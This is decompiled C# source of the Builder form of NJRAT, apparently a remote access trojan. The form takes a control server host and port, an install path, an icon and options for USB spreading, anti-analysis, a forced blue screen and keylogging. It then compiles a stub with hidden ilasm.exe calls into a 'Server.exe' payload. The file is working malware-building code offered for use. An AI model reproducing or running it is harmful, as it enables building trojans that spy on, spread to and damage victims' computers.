using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace NJRAT
{
	// Token: 0x0200000C RID: 12
	[DesignerGenerated]
	public partial class Builder : Form
	{
		// Token: 0x060000A2 RID: 162 RVA: 0x0014B940 File Offset: 0x00149D40
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Builder.__ENCList;
			lock (_ENCList)
			{
				bool flag = Builder.__ENCList.Count == Builder.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Builder.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Builder.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Builder.__ENCList[num] = Builder.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Builder.__ENCList.RemoveRange(num, Builder.__ENCList.Count - num);
					Builder.__ENCList.Capacity = Builder.__ENCList.Count;
				}
				Builder.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x060000A5 RID: 165 RVA: 0x0014D778 File Offset: 0x0014BB78
		// (set) Token: 0x060000A6 RID: 166 RVA: 0x0014D790 File Offset: 0x0014BB90
		internal virtual TextBox usbx
		{
			[DebuggerNonUserCode]
			get
			{
				return this._usbx;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._usbx = value;
			}
		}

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x060000A7 RID: 167 RVA: 0x0014D79C File Offset: 0x0014BB9C
		// (set) Token: 0x060000A8 RID: 168 RVA: 0x0014D7B4 File Offset: 0x0014BBB4
		internal virtual TextBox anti3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._anti3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._anti3 = value;
			}
		}

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x060000A9 RID: 169 RVA: 0x0014D7C0 File Offset: 0x0014BBC0
		// (set) Token: 0x060000AA RID: 170 RVA: 0x0014D7D8 File Offset: 0x0014BBD8
		internal virtual CheckBox RZ
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RZ;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RZ = value;
			}
		}

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x060000AB RID: 171 RVA: 0x0014D7E4 File Offset: 0x0014BBE4
		// (set) Token: 0x060000AC RID: 172 RVA: 0x0014D7FC File Offset: 0x0014BBFC
		internal virtual CheckBox anti2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._anti2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.anti2_CheckedChanged);
				bool flag = this._anti2 != null;
				if (flag)
				{
					this._anti2.CheckedChanged -= eventHandler;
				}
				this._anti2 = value;
				flag = this._anti2 != null;
				if (flag)
				{
					this._anti2.CheckedChanged += eventHandler;
				}
			}
		}

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x060000AD RID: 173 RVA: 0x0014D85C File Offset: 0x0014BC5C
		// (set) Token: 0x060000AE RID: 174 RVA: 0x0014D874 File Offset: 0x0014BC74
		internal virtual CheckBox HD
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HD;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._HD = value;
			}
		}

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x060000AF RID: 175 RVA: 0x0014D880 File Offset: 0x0014BC80
		// (set) Token: 0x060000B0 RID: 176 RVA: 0x0014D898 File Offset: 0x0014BC98
		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button5_Click);
				bool flag = this._Button5 != null;
				if (flag)
				{
					this._Button5.Click -= eventHandler;
				}
				this._Button5 = value;
				flag = this._Button5 != null;
				if (flag)
				{
					this._Button5.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060000B1 RID: 177 RVA: 0x0014D8F8 File Offset: 0x0014BCF8
		// (set) Token: 0x060000B2 RID: 178 RVA: 0x0014D910 File Offset: 0x0014BD10
		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button4_Click);
				bool flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click -= eventHandler;
				}
				this._Button4 = value;
				flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000044 RID: 68
		// (get) Token: 0x060000B3 RID: 179 RVA: 0x0014D970 File Offset: 0x0014BD70
		// (set) Token: 0x060000B4 RID: 180 RVA: 0x0014D988 File Offset: 0x0014BD88
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x060000B5 RID: 181 RVA: 0x0014D994 File Offset: 0x0014BD94
		// (set) Token: 0x060000B6 RID: 182 RVA: 0x0014D9AC File Offset: 0x0014BDAC
		internal virtual CheckBox usb
		{
			[DebuggerNonUserCode]
			get
			{
				return this._usb;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.usb_CheckedChanged);
				bool flag = this._usb != null;
				if (flag)
				{
					this._usb.CheckedChanged -= eventHandler;
				}
				this._usb = value;
				flag = this._usb != null;
				if (flag)
				{
					this._usb.CheckedChanged += eventHandler;
				}
			}
		}

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x060000B7 RID: 183 RVA: 0x0014DA0C File Offset: 0x0014BE0C
		// (set) Token: 0x060000B8 RID: 184 RVA: 0x0014DA24 File Offset: 0x0014BE24
		internal virtual Label Label6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label6 = value;
			}
		}

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x060000B9 RID: 185 RVA: 0x0014DA30 File Offset: 0x0014BE30
		// (set) Token: 0x060000BA RID: 186 RVA: 0x0014DA48 File Offset: 0x0014BE48
		internal virtual NumericUpDown klen
		{
			[DebuggerNonUserCode]
			get
			{
				return this._klen;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._klen = value;
			}
		}

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x060000BB RID: 187 RVA: 0x0014DA54 File Offset: 0x0014BE54
		// (set) Token: 0x060000BC RID: 188 RVA: 0x0014DA6C File Offset: 0x0014BE6C
		internal virtual CheckBox Isu
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Isu;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Isu = value;
			}
		}

		// Token: 0x17000049 RID: 73
		// (get) Token: 0x060000BD RID: 189 RVA: 0x0014DA78 File Offset: 0x0014BE78
		// (set) Token: 0x060000BE RID: 190 RVA: 0x0014DA90 File Offset: 0x0014BE90
		internal virtual CheckBox Isf
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Isf;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Isf = value;
			}
		}

		// Token: 0x1700004A RID: 74
		// (get) Token: 0x060000BF RID: 191 RVA: 0x0014DA9C File Offset: 0x0014BE9C
		// (set) Token: 0x060000C0 RID: 192 RVA: 0x0014DAB4 File Offset: 0x0014BEB4
		internal virtual TextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		// Token: 0x1700004B RID: 75
		// (get) Token: 0x060000C1 RID: 193 RVA: 0x0014DAC0 File Offset: 0x0014BEC0
		// (set) Token: 0x060000C2 RID: 194 RVA: 0x0014DAD8 File Offset: 0x0014BED8
		internal virtual CheckBox bsod
		{
			[DebuggerNonUserCode]
			get
			{
				return this._bsod;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._bsod = value;
			}
		}

		// Token: 0x1700004C RID: 76
		// (get) Token: 0x060000C3 RID: 195 RVA: 0x0014DAE4 File Offset: 0x0014BEE4
		// (set) Token: 0x060000C4 RID: 196 RVA: 0x0014DAFC File Offset: 0x0014BEFC
		internal virtual Label Label5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label5 = value;
			}
		}

		// Token: 0x1700004D RID: 77
		// (get) Token: 0x060000C5 RID: 197 RVA: 0x0014DB08 File Offset: 0x0014BF08
		// (set) Token: 0x060000C6 RID: 198 RVA: 0x0014DB20 File Offset: 0x0014BF20
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		// Token: 0x1700004E RID: 78
		// (get) Token: 0x060000C7 RID: 199 RVA: 0x0014DB2C File Offset: 0x0014BF2C
		// (set) Token: 0x060000C8 RID: 200 RVA: 0x0014DB44 File Offset: 0x0014BF44
		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CheckBox1_CheckedChanged);
				bool flag = this._CheckBox1 != null;
				if (flag)
				{
					this._CheckBox1.CheckedChanged -= eventHandler;
				}
				this._CheckBox1 = value;
				flag = this._CheckBox1 != null;
				if (flag)
				{
					this._CheckBox1.CheckedChanged += eventHandler;
				}
			}
		}

		// Token: 0x1700004F RID: 79
		// (get) Token: 0x060000C9 RID: 201 RVA: 0x0014DBA4 File Offset: 0x0014BFA4
		// (set) Token: 0x060000CA RID: 202 RVA: 0x0014DBBC File Offset: 0x0014BFBC
		internal virtual CheckBox Idr
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Idr;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Idr_CheckedChanged);
				bool flag = this._Idr != null;
				if (flag)
				{
					this._Idr.CheckedChanged -= eventHandler;
				}
				this._Idr = value;
				flag = this._Idr != null;
				if (flag)
				{
					this._Idr.CheckedChanged += eventHandler;
				}
			}
		}

		// Token: 0x17000050 RID: 80
		// (get) Token: 0x060000CB RID: 203 RVA: 0x0014DC1C File Offset: 0x0014C01C
		// (set) Token: 0x060000CC RID: 204 RVA: 0x0014DC34 File Offset: 0x0014C034
		internal virtual ComboBox dir
		{
			[DebuggerNonUserCode]
			get
			{
				return this._dir;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._dir = value;
			}
		}

		// Token: 0x17000051 RID: 81
		// (get) Token: 0x060000CD RID: 205 RVA: 0x0014DC40 File Offset: 0x0014C040
		// (set) Token: 0x060000CE RID: 206 RVA: 0x0014DC58 File Offset: 0x0014C058
		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		// Token: 0x17000052 RID: 82
		// (get) Token: 0x060000CF RID: 207 RVA: 0x0014DC64 File Offset: 0x0014C064
		// (set) Token: 0x060000D0 RID: 208 RVA: 0x0014DC7C File Offset: 0x0014C07C
		internal virtual TextBox exe
		{
			[DebuggerNonUserCode]
			get
			{
				return this._exe;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._exe = value;
			}
		}

		// Token: 0x17000053 RID: 83
		// (get) Token: 0x060000D1 RID: 209 RVA: 0x0014DC88 File Offset: 0x0014C088
		// (set) Token: 0x060000D2 RID: 210 RVA: 0x0014DCA0 File Offset: 0x0014C0A0
		internal virtual GroupBox GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox1 = value;
			}
		}

		// Token: 0x17000054 RID: 84
		// (get) Token: 0x060000D3 RID: 211 RVA: 0x0014DCAC File Offset: 0x0014C0AC
		// (set) Token: 0x060000D4 RID: 212 RVA: 0x0014DCC4 File Offset: 0x0014C0C4
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x17000055 RID: 85
		// (get) Token: 0x060000D5 RID: 213 RVA: 0x0014DCD0 File Offset: 0x0014C0D0
		// (set) Token: 0x060000D6 RID: 214 RVA: 0x0014DCE8 File Offset: 0x0014C0E8
		internal virtual TextBox VN
		{
			[DebuggerNonUserCode]
			get
			{
				return this._VN;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._VN = value;
			}
		}

		// Token: 0x17000056 RID: 86
		// (get) Token: 0x060000D7 RID: 215 RVA: 0x0014DCF4 File Offset: 0x0014C0F4
		// (set) Token: 0x060000D8 RID: 216 RVA: 0x0014DD0C File Offset: 0x0014C10C
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000057 RID: 87
		// (get) Token: 0x060000D9 RID: 217 RVA: 0x0014DD6C File Offset: 0x0014C16C
		// (set) Token: 0x060000DA RID: 218 RVA: 0x0014DD84 File Offset: 0x0014C184
		internal virtual NumericUpDown port
		{
			[DebuggerNonUserCode]
			get
			{
				return this._port;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._port = value;
			}
		}

		// Token: 0x17000058 RID: 88
		// (get) Token: 0x060000DB RID: 219 RVA: 0x0014DD90 File Offset: 0x0014C190
		// (set) Token: 0x060000DC RID: 220 RVA: 0x0014DDA8 File Offset: 0x0014C1A8
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x17000059 RID: 89
		// (get) Token: 0x060000DD RID: 221 RVA: 0x0014DDB4 File Offset: 0x0014C1B4
		// (set) Token: 0x060000DE RID: 222 RVA: 0x0014DDCC File Offset: 0x0014C1CC
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x1700005A RID: 90
		// (get) Token: 0x060000DF RID: 223 RVA: 0x0014DDD8 File Offset: 0x0014C1D8
		// (set) Token: 0x060000E0 RID: 224 RVA: 0x0014DDF0 File Offset: 0x0014C1F0
		internal virtual TextBox host
		{
			[DebuggerNonUserCode]
			get
			{
				return this._host;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._host = value;
			}
		}

		// Token: 0x1700005B RID: 91
		// (get) Token: 0x060000E1 RID: 225 RVA: 0x0014DDFC File Offset: 0x0014C1FC
		// (set) Token: 0x060000E2 RID: 226 RVA: 0x0014DE14 File Offset: 0x0014C214
		internal virtual LV Lv1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lv1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Lv1 = value;
			}
		}

		// Token: 0x1700005C RID: 92
		// (get) Token: 0x060000E3 RID: 227 RVA: 0x0014DE20 File Offset: 0x0014C220
		// (set) Token: 0x060000E4 RID: 228 RVA: 0x0014DE38 File Offset: 0x0014C238
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x1700005D RID: 93
		// (get) Token: 0x060000E5 RID: 229 RVA: 0x0014DE44 File Offset: 0x0014C244
		// (set) Token: 0x060000E6 RID: 230 RVA: 0x0014DE5C File Offset: 0x0014C25C
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x1700005E RID: 94
		// (get) Token: 0x060000E7 RID: 231 RVA: 0x0014DE68 File Offset: 0x0014C268
		// (set) Token: 0x060000E8 RID: 232 RVA: 0x0014DE80 File Offset: 0x0014C280
		internal virtual CheckBox task
		{
			[DebuggerNonUserCode]
			get
			{
				return this._task;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._task = value;
			}
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x0014DE8C File Offset: 0x0014C28C
		public Builder()
		{
			base.Load += this.Builder_Load;
			Builder.__ENCAddToList(this);
			this.string_0 = null;
			this.InitializeComponent();
		}

		// Token: 0x060000EA RID: 234 RVA: 0x0014DEC0 File Offset: 0x0014C2C0
		private void Builder_Load(object sender, EventArgs e)
		{
			this.dir.SelectedIndex = 0;
			this.host.Text = Class6.smethod_2("host", this.host.Text);
			this.anti3.Text = Class6.smethod_2("anti3", this.anti3.Text);
			this.usbx.Text = Class6.smethod_2("usbx", this.usbx.Text);
			this.port.Value = Conversions.ToDecimal(Class6.smethod_2("p", Conversions.ToString(this.port.Value)));
			this.exe.Text = Class6.smethod_2("exe", this.exe.Text);
			this.dir.SelectedIndex = Conversions.ToInteger(Class6.smethod_2("dir", Conversions.ToString(this.dir.SelectedIndex)));
			this.VN.Text = Class6.smethod_2("vn", this.VN.Text);
			this.bsod.Checked = Conversions.ToBoolean(Class6.smethod_2("bsod", this.bsod.Checked.ToString()));
			this.Idr.Checked = Conversions.ToBoolean(Class6.smethod_2("Idr", this.Idr.Checked.ToString()));
			this.Isu.Checked = Conversions.ToBoolean(Class6.smethod_2("Isu", this.Isu.Checked.ToString()));
			this.Isf.Checked = Conversions.ToBoolean(Class6.smethod_2("Isf", this.Isf.Checked.ToString()));
			this.anti2.Checked = Conversions.ToBoolean(Class6.smethod_2("anti2", this.anti2.Checked.ToString()));
			this.HD.Checked = Conversions.ToBoolean(Class6.smethod_2("hd", this.HD.Checked.ToString()));
			this.usb.Checked = Conversions.ToBoolean(Class6.smethod_2("usb", this.usb.Checked.ToString()));
			this.RZ.Checked = Conversions.ToBoolean(Class6.smethod_2("rz", this.RZ.Checked.ToString()));
			this.task.Checked = Conversions.ToBoolean(Class6.smethod_2("task", this.task.Checked.ToString()));
			this.klen.Value = Conversions.ToDecimal(Class6.smethod_2("klen", this.klen.Value.ToString()));
			this.string_0 = Class6.smethod_2("ico", string.Empty);
			bool flag = !File.Exists(this.string_0);
			if (flag)
			{
				this.string_0 = string.Empty;
			}
			flag = Convert.ToDouble(this.port.Value) != Conversions.ToDouble(Class6.smethod_2("port", Conversions.ToString(this.port.Value)));
			if (flag)
			{
				this.port.Value = Conversions.ToDecimal(Class6.smethod_2("port", Conversions.ToString(this.port.Value)));
			}
			try
			{
				flag = Operators.CompareString(this.string_0, string.Empty, false) != 0;
				if (flag)
				{
					this.PictureBox1.Image = new Icon(Class6.smethod_2("ico", string.Empty)).ToBitmap();
					this.CheckBox1.Checked = true;
				}
			}
			catch (Exception ex)
			{
				this.string_0 = string.Empty;
			}
		}

		// Token: 0x060000EB RID: 235 RVA: 0x0014E2CC File Offset: 0x0014C6CC
		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				SaveFileDialog saveFileDialog = new SaveFileDialog
				{
					Filter = "EXE|*.exe",
					FileName = "Server"
				};
				bool flag = saveFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					bool flag2 = !this.CheckBox1.Checked;
					if (flag2)
					{
						this.string_0 = null;
					}
					flag2 = File.Exists(saveFileDialog.FileName);
					if (flag2)
					{
						File.Delete(saveFileDialog.FileName);
					}
					string text = File.ReadAllText(Application.StartupPath + "\\Stub.il");
					string text2 = Class6.smethod_4(string.Concat(new string[]
					{
						this.VN.Text,
						this.host.Text,
						Conversions.ToString(this.port.Value),
						this.exe.Text,
						this.dir.Text,
						this.bsod.Checked.ToString(),
						this.Idr.Checked.ToString(),
						this.Isu.Checked.ToString(),
						this.Isf.Checked.ToString()
					}));
					TextBox vn = this.VN;
					string text3 = vn.Text;
					vn.Text = text3;
					text = text.Replace("[VN]", Class6.smethod_14(ref text3)).Replace("[H]", this.host.Text).Replace("[P]", Conversions.ToString(this.port.Value))
						.Replace("[EXE]", this.exe.Text)
						.Replace("[DR]", this.dir.Text.Replace("%", string.Empty))
						.Replace("[BD]", this.bsod.Checked.ToString())
						.Replace("[RG]", text2)
						.Replace("[Idr]", this.Idr.Checked.ToString())
						.Replace("[Isu]", this.Isu.Checked.ToString())
						.Replace("[Isf]", this.Isf.Checked.ToString())
						.Replace("[HD]", this.HD.Checked.ToString())
						.Replace("[RZ]", this.RZ.Checked.ToString())
						.Replace("[anti2]", this.anti2.Checked.ToString())
						.Replace("[anti3]", this.anti3.Text)
						.Replace("[usb]", this.usb.Checked.ToString())
						.Replace("[usbx]", this.usbx.Text)
						.Replace("[task]", this.task.Checked.ToString())
						.Replace("[klen]", this.klen.Value.ToString());
					File.WriteAllText(Interaction.Environ("temp") + "\\stub.il", text);
					ProcessStartInfo processStartInfo = new ProcessStartInfo
					{
						FileName = Interaction.Environ("windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\ilasm.exe",
						CreateNoWindow = true,
						WindowStyle = ProcessWindowStyle.Hidden,
						Arguments = string.Concat(new string[]
						{
							"/alignment=512 /QUIET \"",
							Interaction.Environ("temp"),
							"\\stub.il\" /output:\"",
							saveFileDialog.FileName,
							"\""
						})
					};
					Process.Start(processStartInfo).WaitForExit();
					flag2 = this.string_0 != null && File.Exists(this.string_0);
					if (flag2)
					{
						IconN.InjectIcon(saveFileDialog.FileName, this.string_0);
					}
					IntPtr intPtr = GClass2.BeginUpdateResource(saveFileDialog.FileName, false);
					byte[] array = File.ReadAllBytes(Application.StartupPath + "\\Stub.manifest");
					GClass2.UpdateResource(intPtr, (IntPtr)24, (IntPtr)1, 0, array, array.Length);
					GClass2.EndUpdateResource(intPtr, false);
					Class6.smethod_3("host", this.GH1().ToString());
					Class6.smethod_3("p", Conversions.ToString(this.port.Value));
					Class6.smethod_3("exe", this.exe.Text);
					Class6.smethod_3("dir", Conversions.ToString(this.dir.SelectedIndex));
					Class6.smethod_3("vn", this.VN.Text);
					Class6.smethod_3("bsod", this.bsod.Checked.ToString());
					Class6.smethod_3("ico", this.string_0);
					Class6.smethod_3("Idr", this.Idr.Checked.ToString());
					Class6.smethod_3("Isu", this.Isu.Checked.ToString());
					Class6.smethod_3("Isf", this.Isf.Checked.ToString());
					Class6.smethod_3("klen", this.klen.Value.ToString());
					Class6.smethod_3("hd", this.HD.Checked.ToString());
					Class6.smethod_3("rz", this.RZ.Checked.ToString());
					Class6.smethod_3("anti2", this.anti2.Checked.ToString());
					Class6.smethod_3("anti3", this.anti3.Text);
					Class6.smethod_3("usb", this.usb.Checked.ToString());
					Class6.smethod_3("usbx", this.usbx.Text);
					Class6.smethod_3("task", this.task.Checked.ToString());
					Interaction.MsgBox(saveFileDialog.FileName, MsgBoxStyle.OkOnly, "DONE!");
					this.Close();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000EC RID: 236 RVA: 0x0014E984 File Offset: 0x0014CD84
		private void CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox1.Checked;
			if (@checked)
			{
				bool flag = this.PictureBox1.Image == null;
				if (flag)
				{
					OpenFileDialog openFileDialog = new OpenFileDialog
					{
						Filter = "Icon|*.ico",
						Title = "Choose Icon",
						FileName = string.Empty
					};
					flag = openFileDialog.ShowDialog() == DialogResult.OK;
					if (flag)
					{
						this.string_0 = openFileDialog.FileName;
						this.PictureBox1.Image = Image.FromFile(this.string_0);
					}
				}
			}
			else
			{
				this.PictureBox1.Image = null;
			}
		}

		// Token: 0x060000ED RID: 237 RVA: 0x0014EA24 File Offset: 0x0014CE24
		private void Idr_CheckedChanged(object sender, EventArgs e)
		{
			bool flag = !this.Idr.Checked;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.exe.Text, string.Empty, false) == 0;
				if (flag2)
				{
					this.exe.Text = "server.exe";
				}
				this.exe.Enabled = false;
				this.dir.Enabled = false;
			}
			else
			{
				this.exe.Enabled = true;
				this.dir.Enabled = true;
			}
		}

		// Token: 0x060000EE RID: 238 RVA: 0x0014EAAC File Offset: 0x0014CEAC
		public string GH1()
		{
			string text2;
			try
			{
				int num = this.Lv1.Items.Count - 1;
				string text = null;
				for (int i = 0; i <= num; i++)
				{
					text = text + this.Lv1.Items[i].Text + ",";
				}
				text2 = text.Remove(text.Length - 1);
			}
			catch (Exception ex)
			{
				text2 = "";
			}
			return text2;
		}

		// Token: 0x060000EF RID: 239 RVA: 0x0014EB5C File Offset: 0x0014CF5C
		private void Button4_Click(object sender, EventArgs e)
		{
			this.Lv1.Items.Add(this.host.Text);
			this.Button1.Enabled = true;
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x0014EB8C File Offset: 0x0014CF8C
		private void Button5_Click(object sender, EventArgs e)
		{
			try
			{
				this.Lv1.Items.Clear();
				this.Button1.Enabled = false;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x0014EBDC File Offset: 0x0014CFDC
		private void anti2_CheckedChanged(object sender, EventArgs e)
		{
			bool flag = this.anti2.Checked;
			if (flag)
			{
				this.anti3.Enabled = true;
			}
			flag = !this.anti2.Checked;
			if (flag)
			{
				this.anti3.Enabled = false;
			}
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x0014EC28 File Offset: 0x0014D028
		private void usb_CheckedChanged(object sender, EventArgs e)
		{
			bool flag = this.usb.Checked;
			if (flag)
			{
				this.usbx.Enabled = true;
			}
			flag = !this.usb.Checked;
			if (flag)
			{
				this.usbx.Enabled = false;
			}
		}

		// Token: 0x0400004B RID: 75
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400004D RID: 77
		[AccessedThroughProperty("usbx")]
		private TextBox _usbx;

		// Token: 0x0400004E RID: 78
		[AccessedThroughProperty("anti3")]
		private TextBox _anti3;

		// Token: 0x0400004F RID: 79
		[AccessedThroughProperty("RZ")]
		private CheckBox _RZ;

		// Token: 0x04000050 RID: 80
		[AccessedThroughProperty("anti2")]
		private CheckBox _anti2;

		// Token: 0x04000051 RID: 81
		[AccessedThroughProperty("HD")]
		private CheckBox _HD;

		// Token: 0x04000052 RID: 82
		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		// Token: 0x04000053 RID: 83
		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		// Token: 0x04000054 RID: 84
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x04000055 RID: 85
		[AccessedThroughProperty("usb")]
		private CheckBox _usb;

		// Token: 0x04000056 RID: 86
		[AccessedThroughProperty("Label6")]
		private Label _Label6;

		// Token: 0x04000057 RID: 87
		[AccessedThroughProperty("klen")]
		private NumericUpDown _klen;

		// Token: 0x04000058 RID: 88
		[AccessedThroughProperty("Isu")]
		private CheckBox _Isu;

		// Token: 0x04000059 RID: 89
		[AccessedThroughProperty("Isf")]
		private CheckBox _Isf;

		// Token: 0x0400005A RID: 90
		[AccessedThroughProperty("T1")]
		private TextBox _T1;

		// Token: 0x0400005B RID: 91
		[AccessedThroughProperty("bsod")]
		private CheckBox _bsod;

		// Token: 0x0400005C RID: 92
		[AccessedThroughProperty("Label5")]
		private Label _Label5;

